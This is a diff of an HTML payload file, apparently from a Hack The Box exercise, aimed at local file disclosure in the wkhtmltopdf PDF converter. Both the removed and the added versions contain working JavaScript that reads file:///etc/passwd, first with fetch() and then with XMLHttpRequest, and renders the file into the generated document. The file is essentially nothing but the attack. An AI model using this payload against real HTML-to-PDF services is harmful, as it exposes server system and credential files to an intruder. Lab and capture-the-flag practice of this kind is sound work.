@@ -2,50 +2,30 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>HTB wkhtmltopdf LFD test</title>
+  <title>XMLHttpRequest Test</title>
   <style>
-    body { font-family: monospace; white-space: pre-wrap; }
-    h2 { margin-top: 2em; border-bottom: 1px solid #ccc; }
+    body {
+      font-family: monospace;
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
-  <h1>📄 File Disclosure Test</h1>
-
-  <div id="results">Cargando...</div>
+  <h1>📄 XMLHttpRequest + file:// Test</h1>
 
   <script>
-    const filesToTry = [
-      "/etc/passwd"
-    ];
-
-    const delay = ms => new Promise(res => setTimeout(res, ms));
-
-    async function fetchFiles() {
-      const results = document.getElementById('results');
-      results.innerText = '';
-
-      for (let path of filesToTry) {
-        const section = document.createElement('div');
-        section.innerHTML = `<h2>📂 ${path}</h2>`;
-
-        try {
-          const res = await fetch("file://" + path);
-          const text = await res.text();
-          const content = document.createElement('pre');
-          content.textContent = text;
-          section.appendChild(content);
-        } catch (e) {
-          const error = document.createElement('pre');
-          error.textContent = '[ERROR] No se pudo leer.';
-          section.appendChild(error);
-        }
-
-        results.appendChild(section);
-
-      }
-    }
-
-    fetchFiles();
+    var x = new XMLHttpRequest();
+    x.onload = function () {
+      // En vez de usar document.write(), insertamos dentro de un <pre>
+      var pre = document.createElement("pre");
+      pre.innerText = this.responseText;
+      document.body.appendChild(pre);
+    };
+    x.onerror = function () {
+      document.body.innerHTML += "<p>[❌] Error al leer el archivo.</p>";
+    };
+    x.open("GET", "file:///etc/passwd");
+    x.send();
   </script>
 </body>
 </html>
